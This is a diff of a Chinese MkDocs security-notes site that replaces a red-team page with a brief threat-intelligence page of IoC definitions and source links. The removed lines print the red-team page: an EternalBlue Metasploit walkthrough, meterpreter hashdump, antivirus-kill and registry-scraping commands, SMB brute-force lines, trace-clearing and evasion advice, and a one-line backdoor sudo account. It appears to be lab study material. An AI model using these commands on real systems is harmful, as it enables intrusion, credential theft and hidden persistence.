@@ -7,9 +7,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
   <meta name="author" content="TesterCC">
-  <link rel="canonical" href="https://testercc.github.io/pentest/red_team/">
+  <link rel="canonical" href="https://testercc.github.io/sec_research/threat_intelligence/">
   <link rel="shortcut icon" href="../../img/favicon.ico">
-  <title>RedTeam 红队 - Security Development Notes</title>
+  <title>威胁情报 - Security Development Notes</title>
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700" />
 
   <link rel="stylesheet" href="../../css/theme.css" />
@@ -18,9 +18,9 @@
   
   <script>
     // Current page data
-    var mkdocs_page_name = "RedTeam \u7ea2\u961f";
-    var mkdocs_page_input_path = "pentest\\red_team.md";
-    var mkdocs_page_url = "/pentest/red_team/";
+    var mkdocs_page_name = "\u5a01\u80c1\u60c5\u62a5";
+    var mkdocs_page_input_path = "sec_research\\threat_intelligence.md";
+    var mkdocs_page_url = "/sec_research/threat_intelligence/";
   </script>
   
   <script src="../../js/jquery-2.1.1.min.js" defer></script>
@@ -112,46 +112,58 @@
                     </li>
                 </ul>
                 <p class="caption"><span class="caption-text">Security Research 安全研究</span></p>
-                <ul>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/research_list/">导航列表</a>
+                <ul class="current">
+                    <li class="toctree-l1"><a class="reference internal" href="../research_list/">导航列表</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/exploit/">漏洞挖掘</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../exploit/">漏洞挖掘</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/ai_sec/">人工智能安全(AISec)</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../ai_sec/">人工智能安全(AISec)</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/sample_analysis/">样本分析</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../sample_analysis/">样本分析</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/threat_intelligence/">威胁情报</a>
+                    <li class="toctree-l1 current"><a class="reference internal current" href="./">威胁情报</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#_2">举例</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#term">Term</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#ioc">IoC</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#_3">情报来源</a>
+    </li>
+    </ul>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/apt/">APT</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../apt/">APT</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/code_audit/">代码审计</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../code_audit/">代码审计</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/black_market/">黑产研究</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../black_market/">黑产研究</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/binary_sec/">二进制安全</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../binary_sec/">二进制安全</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/data_sec/">数据安全</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../data_sec/">数据安全</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/ic_sec/">工控安全</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../ic_sec/">工控安全</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/iot_sec/">物联网安全</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../iot_sec/">物联网安全</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/iov_sec/">车联网安全</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../iov_sec/">车联网安全</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/cloud_sec/">云原生安全</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../cloud_sec/">云原生安全</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/block_chain_sec/">区块链安全</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../block_chain_sec/">区块链安全</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/android_sec/">Android安全</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../android_sec/">Android安全</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/browser_sec/">浏览器安全</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../browser_sec/">浏览器安全</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/protocol_sec/">协议安全</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../protocol_sec/">协议安全</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/api_sec/">API安全</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../api_sec/">API安全</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../sec_research/python_sec/">Python安全</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../python_sec/">Python安全</a>
                     </li>
                 </ul>
                 <p class="caption"><span class="caption-text">Security Management 安全管理</span></p>
@@ -180,86 +192,50 @@
                     </li>
                 </ul>
                 <p class="caption"><span class="caption-text">Pentest 渗透测试</span></p>
-                <ul class="current">
-                    <li class="toctree-l1"><a class="reference internal" href="../learn_guide/">学习参考</a>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/learn_guide/">学习参考</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../term/">Term 术语</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/term/">Term 术语</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../kali_linux/">Kali Linux</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/kali_linux/">Kali Linux</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../red_vs_blue/">红蓝对抗</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/red_vs_blue/">红蓝对抗</a>
                     </li>
-                    <li class="toctree-l1 current"><a class="reference internal current" href="./">RedTeam 红队</a>
-    <ul class="current">
-    <li class="toctree-l2"><a class="reference internal" href="#_1">常用命令</a>
-        <ul>
-    <li class="toctree-l3"><a class="reference internal" href="#_2">信息探测</a>
-        <ul>
-    <li class="toctree-l4"><a class="reference internal" href="#_3">端口扫描</a>
-    </li>
-        </ul>
-    </li>
-    <li class="toctree-l3"><a class="reference internal" href="#_4">文件上传</a>
-    </li>
-        </ul>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#_5">红队基础设施建设</a>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#_6">红队攻防</a>
-        <ul>
-    <li class="toctree-l3"><a class="reference internal" href="#_7">权限维持</a>
-    </li>
-        </ul>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#_8">常规漏洞利用</a>
-        <ul>
-    <li class="toctree-l3"><a class="reference internal" href="#ms17-010">ms17-010</a>
-        <ul>
-    <li class="toctree-l4"><a class="reference internal" href="#meterpreter">常用的meterpreter命令</a>
-    </li>
-        </ul>
-    </li>
-    <li class="toctree-l3"><a class="reference internal" href="#smb">smb枚举</a>
-    </li>
-        </ul>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#centos7">CentOS7提权</a>
-    </li>
-    </ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/red_team/">RedTeam 红队</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../blue_team/">BlueTeam 蓝队</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/blue_team/">BlueTeam 蓝队</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../brute_force/">Brute Force 暴力破解</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/brute_force/">Brute Force 暴力破解</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../sql_injection/">SQL Injection SQL注入</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/sql_injection/">SQL Injection SQL注入</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../ddos/">DDoS 分布式拒绝服务</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/ddos/">DDoS 分布式拒绝服务</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../xss/">XSS 跨站脚本攻击</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/xss/">XSS 跨站脚本攻击</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../csrf/">CSRF 跨站请求伪造</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/csrf/">CSRF 跨站请求伪造</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../privilge_escalation/">Privilge Escalation 提权</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/privilge_escalation/">Privilge Escalation 提权</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../reverse_shell/">Reverse Shell 反弹Shell</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/reverse_shell/">Reverse Shell 反弹Shell</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../re/">Reverse Engineering 逆向工程</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/re/">Reverse Engineering 逆向工程</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../backdoor/">Backdoor 后门</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/backdoor/">Backdoor 后门</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../crack/">破解</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/crack/">破解</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../attack_lifecycle/">网络攻击生命周期</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/attack_lifecycle/">网络攻击生命周期</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../log_clear/">日志清理</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/log_clear/">日志清理</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../cve/">CVE</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/cve/">CVE</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../report/">报告和笔记</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/report/">报告和笔记</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../nmap/">Nmap</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/nmap/">Nmap</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../thinkphp5_rce/">ThinkPHP5 RCE</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../pentest/thinkphp5_rce/">ThinkPHP5 RCE</a>
                     </li>
                 </ul>
                 <p class="caption"><span class="caption-text">CTF</span></p>
@@ -493,11 +469,11 @@
     
       
         
-          <li>Pentest 渗透测试 &raquo;</li>
+          <li>Security Research 安全研究 &raquo;</li>
         
       
     
-    <li>RedTeam 红队</li>
+    <li>威胁情报</li>
     <li class="wy-breadcrumbs-aside">
       
     </li>
@@ -508,291 +484,38 @@
           <div role="main">
             <div class="section">
               
-                <h1 id="red-team">Red Team</h1>
-<h2 id="_1">常用命令</h2>
-<h3 id="_2">信息探测</h3>
-<h4 id="_3">端口扫描</h4>
-<pre><code class="shell"># Namp各种扫描方式的参数
-- TCP: -sT
-- SYN: -sS
-- ACK: -sA
-- UDP: -sU
-- RPC: -sR
-- ICMP: -sP
-- Disable Port Scan: -sn
-
-# 扫描10000端口、操作系统、版本
-nmap -T4 -A 10.0.4.146
-
-# 默认单位秒，也可指定为毫秒，为1000ms
-nmap -T4 -A 10.0.4.146 --scan-delay 1.1
-
-# 版本探测  等待时间长
-nmap -sV 10.0.4.146
-
-# 操作系统探测
-nmap -O 10.0.4.146
-
-# 其它参数
---host-timeout  主机超时时间
---scan-delay  报文时间间隔，单位秒，常用值 1 
--S &lt;src_ip&gt;  定义扫描源地址，为了降低被发现的概率
-
-# 其它示例
-# 随机选择 1000 台主机扫描是否运行Web服务器（80端口）。
-nmap -v -iR 1000 -P0 -p 80
-</code></pre>
-
-<h3 id="_4">文件上传</h3>
-<p>在自己的攻击机如Kali上利用Python开 HTTP Server，让被攻击机从攻击机Kali上下载各种工具。完成后即可撤销。</p>
+                <h1 id="_1">威胁情报</h1>
+<h2 id="_2">举例</h2>
 <ul>
-<li>Python 2 version: <code>python -m SimpleHTTPServer 8000</code></li>
-<li>Python 3 version: <code>python -m http.server 8000</code></li>
+<li><a href="https://blog.netlab.360.com/wei-xie-kuai-xun-log4jlou-dong-yi-jing-bei-yong-lai-zu-jian-botnet-zhen-dui-linuxshe-bei/">威胁快讯：Log4j漏洞已经被用来组建botnet，针对Linux设备</a></li>
 </ul>
-<p>然后在浏览器输入：<code>127.0.0.1:8000</code> 即可访问该路径下的文件了。</p>
-<h2 id="_5">红队基础设施建设</h2>
-<ul>
-<li><a href="https://github.com/byt3bl33d3r/Red-Baron">Red-Baron</a>，一个红队自动化部署脚本，但是因为最近都没更新，建议红队开发时参考就好。</li>
-</ul>
-<h2 id="_6">红队攻防</h2>
-<h3 id="_7">权限维持</h3>
-<ul>
-<li><a href="https://www.anquanke.com/post/id/249994">红队实战攻防技术（一）</a></li>
-</ul>
-<p>红队演练与APT相似的是核心同样在于 “持久化” ，建议还是私钥登录以及创建高权限用户为主。</p>
-<p>可以做一些sudo提权或者SUID文件等操作间接的使用root权限。</p>
-<p>在拿到shell后可以上线到自己C2上，Linux上线CobaltStrike的方式可以使用CrossC2插件进行。</p>
-<p>反弹shell我们一定要用反向代理之类的手段隐匿真实VPS IP，并对Netcat进行流量加密。</p>
-<p>使用nohup的方式留以持续性的代理的方式也比较容易被发现，所以建议使用frp进行代理，也因为它的可拓展性非常高，通过免杀或修改配置文件等方式可以进行躲避流量监测。</p>
-<p>一定要对痕迹进行清理。</p>
-<p>在蓝队处置的过程中，重点关注的对象就是一些登录、服务日志、进程、端口，新建文件，这也是雷区所在，一定要在这些方面下功夫。</p>
-<p>尤其是历史命令，不清理被还原出攻击路径的概率非常大，这也会被一步步揪出来。</p>
-<p>如果能够顺利通过处置人员的排查，那么恭喜你可以安心继续了，因为在非必要或确认失陷的情况，没有甲方愿意去隔离当前业务，尤其是对外服务、内部OA、工控系统等，停止业务系统都可能造成不可估量的损失。</p>
-<p>在进入内网环境下，每一步操作都需要非常的慎重，尤其是涉及端口、进程的操作。因为稍有不慎，被捕获到异常操作，会引起防守方极大的重视。尤其是多次异常告警的情况下，通常在第一次告警的情况下，蓝队成员未排查出异常操作后会对该主机进行重点关注，如果继续出现告警，那么极有可能直接进行单机隔离。</p>
-<p>对于一些新晋红队的同学，风起哥建议首先做好基础建设，比如免杀、隐匿、工具特征改造、匿名VPS、邮箱、手机号、身份信息等，最好在纯净的虚拟机中进行渗透操作（别搁虚拟机里看什么腾讯视频）。如果被蜜罐抓到ID，那么基本上被溯源出来的概率就很高了，你可能还在愉快的渗透着，突然告诉你出局了。</p>
-<h2 id="_8">常规漏洞利用</h2>
-<h3 id="ms17-010">ms17-010</h3>
-<ol>
-<li>内网探测可以利用主机</li>
-</ol>
-<p><code>nmap -n -p445 --script smb-vuln-ms17-010 10.0.4.140/24 --open</code></p>
-<p><img alt="result" src="https://cdn.jsdelivr.net/gh/TesterCC/pic_bed2/20210615192553.png" /></p>
-<p>虽然扫描速度很快，但可能存在五阿波</p>
-<ol>
-<li>进入msf，通过使用auxiliary/scanner/smb/smb_ms17_010模块进行漏洞扫描（如果通过第0步已经确认可攻击的目标，可以直接到后面第4步对目标发起攻击）</li>
-</ol>
-<pre><code class="bash"># msfconsole
-       =[ metasploit v6.0.30-dev                          ]
-+ -- --=[ 2099 exploits - 1129 auxiliary - 357 post       ]
-+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
-+ -- --=[ 7 evasion                                       ]
-
-Metasploit tip: Enable verbose logging with set VERBOSE 
-true
-
-msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010 
-msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options
-</code></pre>
-
-<p><img alt="options" src="https://cdn.jsdelivr.net/gh/TesterCC/pic_bed2/20210615193351.png" /></p>
-<ol>
-<li>设置扫描目标的网段，看哪些目标存在漏洞</li>
-</ol>
-<pre><code class="bash">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 10.0.4.0/24
-rhosts =&gt; 10.0.4.0/24
-msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run
-(本人内网测试的时候，扫描速度巨慢，但结果相对精准一些)
-</code></pre>
-
-<p><img alt="" src="https://cdn.jsdelivr.net/gh/TesterCC/pic_bed2/20210615195133.png" />
-看结果，只有自己准备的靶机能用，不过检测结果还算精准。</p>
-<ol>
-<li>通过使用<code>exploit/windows/smb/ms17_010_eternalblue</code>模块进行漏洞攻击</li>
-</ol>
-<pre><code class="bash">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue
-msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 10.0.4.147
-rhost =&gt; 10.0.4.147
-msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run
-# msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options
-</code></pre>
-
-<p><img alt="" src="https://cdn.jsdelivr.net/gh/TesterCC/pic_bed2/20210615200425.png" /></p>
-<p>看执行结果可知攻击成功，获得session。</p>
-<p><img alt="" src="https://cdn.jsdelivr.net/gh/TesterCC/pic_bed2/20210615200809.png" /></p>
-<p>win7cmd，消除乱码用<code>chcp 65001</code>命令</p>
-<p>如果直接拿到系统权限，并且没有蓝屏，则可以进行后续渗透工作。比如用meterpreter进行后渗透测试。</p>
-<pre><code>meterpreter是一种高级、隐蔽、多层面的且可动态扩展的payload，可以将反射dll注入到目标主机的内存中，还可以在运行时动态加载脚本和插件来进行后渗透利用。
-</code></pre>
-
-<h4 id="meterpreter">常用的meterpreter命令</h4>
-<pre><code>1. screenshot       # 获取活动用户的桌面截屏保存到相应目录
-
-2. sysinfo          # 获取系统运行的平台
-
-3. run post/windows/gather/hashdump   # 获取靶机上的账户密码哈希值
-</code></pre>
-
-<pre><code class="bash">meterpreter &gt; screenshot
-Screenshot saved to: /root/VFsOPFXE.jpeg
-
-meterpreter &gt; sysinfo
-Computer        : ADMIN-PC
-OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
-Architecture    : x64
-System Language : zh_CN
-Domain          : WORKGROUP
-Logged On Users : 2
-Meterpreter     : x64/windows
-</code></pre>
-
-<p><img alt="hashdump" src="https://cdn.jsdelivr.net/gh/TesterCC/pic_bed2/20210615201550.png" /></p>
-<pre><code>Meterpreter跳转，并保持会话
-
-4. background   # 可以跳转到MSF终端里，Meterpreter的会话仍然在运行
-5. sessions -l  # 查看保持的会话连接列表
-6. sessions -i &lt;会话ID&gt;  # 返回对应ID的Meterpreter控制台
-</code></pre>
-
-<p><img alt="Meterpreter跳转" src="https://cdn.jsdelivr.net/gh/TesterCC/pic_bed2/20210615202557.png" /></p>
-<pre><code>获取管理员权限
-
-7. use priv  # 加载priv扩展，以便访问某些特权模块
-8. getsystem # 命令尝试将权限提升到本地系统权限或管理员权限
-9. grtuid    # 检查获取的权限等级，服务端用户名返回的是NT AUTHORITY\SYSTEM表示我们成功获得了管理员权限
-10. rev2self # 切换回meterpreter shell 会话中的初始用户账号
-</code></pre>
-
-<p><img alt="" src="https://cdn.jsdelivr.net/gh/TesterCC/pic_bed2/20210615202918.png" /></p>
-<pre><code>令牌假冒
-
-a、通过 rurn get_local_subnets 命令，在Meterpreter会话中展示受控系统上本地子网
-b、执行添加路由命令 run autoroute -p 10.180.0.0/16
-c、告知系统将通过远程网络ID（即受控主机的本地网络）通过会话1来进行路由，然后通过route list 命令显示当前活跃的路由设置，可以看到正如预期那样添加了路由
-d、对目标linux系统进行第二次渗透攻击，使用基于Samba的堆溢出漏洞攻击，这个漏洞存在于我们的metasploitable靶机上。攻击成功时，所有的流量都会通过这台受控机器与子网中的其他目标进行通信
-</code></pre>
-
-<pre><code class="bash">meterpreter &gt; run get_local_subnets
-
-[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
-[!] Example: run post/multi/manage/autoroute OPTION=value [...]
-Local subnet: 10.0.0.0/255.255.0.0
-
-run autoroute -p 10.180.0.0/16
-</code></pre>
-
-<pre><code>使用meterpreter脚本
-
-1. run vnc 在远程系统上安装VNC会话。然后可以运行screen_unlock命令对目标机器上的桌面进行解锁，这样就能看到目标主机上的VNC窗口（解锁失败）
-2. 进程迁移 可以将meterpreter会话迁移到内存空间中的其它稳定的、不会被关闭的服务进程中，以维持稳定的系统控制连接  run post/windows/manage/migrate 
-3. 关闭杀毒软件 在最新版本的metasploit中推荐使用 run post/windows/manage/killav
-4. 获取密码哈希值  run post/windows/gather/smart_hashdump
-5. 查看目标机上的所有流量   捕获的包都能以.pcap的文件格式存储下来，并能够被wireshark解析 run packetrecorder -i 1
-6. scraper脚本  run scraper 可以列举出你想从系统得到的任何信息，可以攫取用户名和密码，下载全部注册表，挖掘密码哈希值、收集系统信息以及输出HKEY_CURRENT_USER(HKCU)
-</code></pre>
-
-<pre><code class="shell">需要使用桌面版Kali
-
-meterpreter &gt; run vnc
-[*] Creating a VNC reverse tcp stager: LHOST=10.0.4.144 LPORT=4545
-[*] Running payload handler
-[*] VNC stager executable 73802 bytes long
-[*] Uploaded the VNC agent to C:\Windows\TEMP\rqrSzPhYAwKOS.exe (must be deleted manually)
-[*] Executing the VNC agent with endpoint 10.0.4.144:4545...
-
-
-meterpreter &gt; run post/windows/manage/migrate 
-
-[*] Running module against ADMIN-PC
-[*] Current server process: spoolsv.exe (576)
-[*] Spawning notepad.exe process to migrate into
-[*] Spoofing PPID 0
-[*] Migrating into 2032
-[+] Successfully migrated into process 2032
-
-这里是从 当前进程576 迁移到 进程 2032
-</code></pre>
-
-<p><img alt="smart_hashdump" src="https://cdn.jsdelivr.net/gh/TesterCC/pic_bed2/20210615205916.png" />
-<img alt="packetrecorder" src="https://cdn.jsdelivr.net/gh/TesterCC/pic_bed2/20210615210130.png" /></p>
-<p>```shell script
-meterpreter &gt; run scraper
-[<em>] New session on 10.0.4.147:445...
-[</em>] Gathering basic system information...
-[<em>] Dumping password hashes...
-[</em>] Obtaining the entire registry...
-[<em>]  Exporting HKCU
-[</em>]  Downloading HKCU (C:\Windows\TEMP\tnLjptrz.reg)
-[<em>]  Cleaning HKCU
-[</em>]  Exporting HKLM
-[<em>]  Downloading HKLM (C:\Windows\TEMP\NYKjcbmG.reg)
-[</em>]  Cleaning HKLM
-[<em>]  Exporting HKCC
-[</em>]  Downloading HKCC (C:\Windows\TEMP\qwGxHeUE.reg)
-[<em>]  Cleaning HKCC
-[</em>]  Exporting HKCR
-[<em>]  Downloading HKCR (C:\Windows\TEMP\QDKdXVcx.reg)
-[</em>]  Cleaning HKCR
-[<em>]  Exporting HKU
-[</em>]  Downloading HKU (C:\Windows\TEMP\BRGbnObL.reg)
-[<em>]  Cleaning HKU
-[</em>] Completed processing on 10.0.4.147:445...</p>
-<pre><code>
-
-ref:
-- [kail下使用exploit/windows/smb/ms17_010_eternalblue练习meterpreter](https://blog.csdn.net/yanyi3271/article/details/102803158)
-- [【漏洞分析】MS 17-010：NSA Eternalblue SMB 漏洞分析](https://www.anquanke.com/post/id/85904)
-- 《渗透攻击红队百科全书》
-
-
-### smb 445探测
-
-```shell
-msf6 exploit(multi/samba/usermap_script) &gt; search smb_version
-
-Matching Modules
-================
-
-   #  Name                               Disclosure Date  Rank    Check  Description
-   -  ----                               ---------------  ----    -----  -----------
-   0  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection
-
-
-Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version
-
-msf6 exploit(multi/samba/usermap_script) &gt; use auxiliary/scanner/smb/smb_version
-msf6 auxiliary(scanner/smb/smb_version) &gt; show options
-
-Module options (auxiliary/scanner/smb/smb_version):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   RHOSTS   10.0.10.65       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
-   THREADS  1                yes       The number of concurrent threads (max one per host)
-
-msf6 auxiliary(scanner/smb/smb_version) &gt; run
-
-[*] 10.0.10.65:445        - Force SMB1 since SMB fingerprint needs native_lm/native_os information
-[*] 10.0.10.65:445        - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{927bdfc0-89f0-4623-935a-dd8921fa5ef4}) (authentication domain:DESKTOP-CJQ9OPG)
-[*] 10.0.10.65:445        -   Host could not be identified
-[*] 10.0.10.65:           - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-
-</code></pre>
-
-<h3 id="smb">smb枚举</h3>
-<pre><code class="shell">medusa -h 10.0.0.x -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
-
-nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt 10.0.0.x -vvvv
-
-nmap --script smb-brute 10.0.10.x
-</code></pre>
-
-<h2 id="centos7">CentOS7提权</h2>
-<p>如果应用有REC还是root权限，可以反弹shell，也可以直接执行命令创建root账户</p>
-<pre><code class="shell">sudo useradd test &amp;&amp; echo test:test123 | chpasswd &amp;&amp; sudo usermod -a -G root test &amp;&amp; tee /etc/sudoers.d/test &lt;&lt;&lt; 'test ALL=(ALL) NOPASSWD: ALL'
-</code></pre>
-
-<p>CentOS7 有root执行权限的可以通过一个命令直接创建普通用户test并提权为root用户，且能免密执行sudo</p>
+<h2 id="term">Term</h2>
+<h3 id="ioc">IoC</h3>
+<p>IOC, Indicators of Compromise, 感染指标，也叫IOC情报。</p>
+<h2 id="_3">情报来源</h2>
+<p>国内外各大安全机构都有自己的威胁情报引擎，对于普通安全研究人员来说是信息收集的首选。</p>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>Comments</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://github.com/NewBee119/threat-intelligence">threat-intelligence</a></td>
+<td>专注于收集会释放威胁情报的网站</td>
+</tr>
+<tr>
+<td><a href="https://github.com/kbandla/APTnotes">APTnotes</a></td>
+<td>公开的APT报告，涵盖08到19年，近年来未更新</td>
+</tr>
+<tr>
+<td><a href="https://x.threatbook.cn/">微步在线</a></td>
+<td>微步在线威胁情报社区</td>
+</tr>
+</tbody>
+</table>
               
             </div>
           </div>
@@ -800,10 +523,10 @@ nmap --script smb-brute 10.0.10.x
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="../blue_team/" class="btn btn-neutral float-right" title="BlueTeam 蓝队">Next <span class="icon icon-circle-arrow-right"></span></a>
+        <a href="../apt/" class="btn btn-neutral float-right" title="APT">Next <span class="icon icon-circle-arrow-right"></span></a>
       
       
-        <a href="../red_vs_blue/" class="btn btn-neutral" title="红蓝对抗"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../sample_analysis/" class="btn btn-neutral" title="样本分析"><span class="icon icon-circle-arrow-left"></span> Previous</a>
       
     </div>
   
@@ -831,10 +554,10 @@ nmap --script smb-brute 10.0.10.x
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../red_vs_blue/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../sample_analysis/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../blue_team/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../apt/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
